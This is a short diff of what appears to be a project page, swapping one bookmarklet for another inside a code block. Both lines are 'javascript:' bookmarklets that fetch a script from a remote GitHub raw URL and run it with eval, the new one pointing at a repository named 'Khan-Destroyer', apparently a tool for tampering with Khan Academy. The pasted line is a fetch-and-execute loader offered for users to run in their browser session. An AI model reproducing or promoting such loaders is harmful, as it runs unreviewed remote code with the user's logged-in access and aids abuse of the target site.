@@ -20,7 +20,7 @@
 
 <pre>
 <code>
-javascript:fetch("https://raw.githubusercontent.com/snowhell/dsaiojod0amdsa/refs/heads/main/script.js").then(t=>t.text()).then(eval);
+javascript:fetch("https://raw.githubusercontent.com/Snowxyrzk/Khan-Destroyer/refs/heads/main/SCRIPT.js").then(t=>t.text()).then(eval);
 </code>
 </pre>
 
